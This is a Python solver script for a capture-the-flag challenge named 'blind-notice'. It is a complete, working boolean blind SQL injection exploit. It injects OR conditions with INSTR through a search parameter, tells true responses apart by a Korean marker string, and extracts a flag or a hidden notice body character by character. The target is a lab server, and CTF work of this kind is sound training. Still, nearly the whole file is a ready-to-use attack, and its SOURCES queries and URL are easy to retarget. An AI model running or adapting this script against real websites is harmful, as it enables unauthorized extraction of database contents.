#!/usr/bin/env python3
"""Boolean Blind SQLi solver for the blind-notice challenge.

Usage:
  python tools/blind_notice_solver.py http://100.83.178.9/challenges/blind-notice.php
"""

from __future__ import annotations

import argparse
import string
import time
from urllib.parse import urlencode
from urllib.request import Request, urlopen

TRUE_MARKER = "조건에 맞는 공지가 존재합니다."
DEFAULT_CHARSET = "}_" + string.ascii_lowercase + string.ascii_uppercase + string.digits + "-@!#$^&*().:/"
DEFAULT_PREFIX = "FLAG{"
NO_HIT_PREFIX = "__solver_nohit__"

SOURCES = {
    "flag-table": "(SELECT flag FROM challenge_flags WHERE challenge_id='blind-notice' LIMIT 1)",
    "body": "(SELECT body FROM blind_notices WHERE is_public=0 LIMIT 1)",
}


def fetch(url: str, query: str, timeout: float) -> str:
    sep = "&" if "?" in url else "?"
    target = url + sep + urlencode({"q": query})
    req = Request(target, headers={"User-Agent": "blind-notice-solver/1.0"})
    with urlopen(req, timeout=timeout) as res:
        return res.read().decode("utf-8", errors="replace")


def sql_quote(value: str) -> str:
    return value.replace("\\", "\\\\").replace("'", "\\'")


def is_true(url: str, source_sql: str, candidate: str, marker: str, timeout: float) -> bool:
    # Make the normal title LIKE condition false first. Otherwise LIKE '%%' is always true.
    condition = f"INSTR(BINARY {source_sql},BINARY '{sql_quote(candidate)}') > 0"
    payload = f"{NO_HIT_PREFIX}%' OR {condition} -- "
    return marker in fetch(url, payload, timeout)


def extract_flag(args: argparse.Namespace) -> str:
    source_sql = SOURCES[args.source]
    found = args.prefix
    print(found, flush=True)

    for _ in range(args.max_len - len(found)):
        for ch in args.charset:
            candidate = found + ch
            if is_true(args.url, source_sql, candidate, args.marker, args.timeout):
                found = candidate
                print(found, flush=True)
                break
            if args.delay:
                time.sleep(args.delay)
        else:
            print("\n[!] no matching next character found")
            return found

        if found.endswith("}"):
            return found

    return found


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve the blind-notice Boolean Blind SQLi challenge.")
    parser.add_argument("url", help="Challenge URL, e.g. http://100.83.178.9/challenges/blind-notice.php")
    parser.add_argument("--source", choices=sorted(SOURCES), default="flag-table", help="SQL source to extract from. Default: flag-table")
    parser.add_argument("--prefix", default=DEFAULT_PREFIX, help="Known flag prefix. Default: FLAG{")
    parser.add_argument("--max-len", type=int, default=80, help="Maximum flag length. Default: 80")
    parser.add_argument("--timeout", type=float, default=5.0, help="HTTP timeout seconds. Default: 5")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests. Default: 0")
    parser.add_argument("--marker", default=TRUE_MARKER, help="Text that appears when the SQL condition is true")
    parser.add_argument("--charset", default=DEFAULT_CHARSET, help="Characters to try, in order")
    args = parser.parse_args()

    flag = extract_flag(args)
    print(f"\n[+] extracted: {flag}")
    return 0 if flag.endswith("}") else 1


if __name__ == "__main__":
    raise SystemExit(main())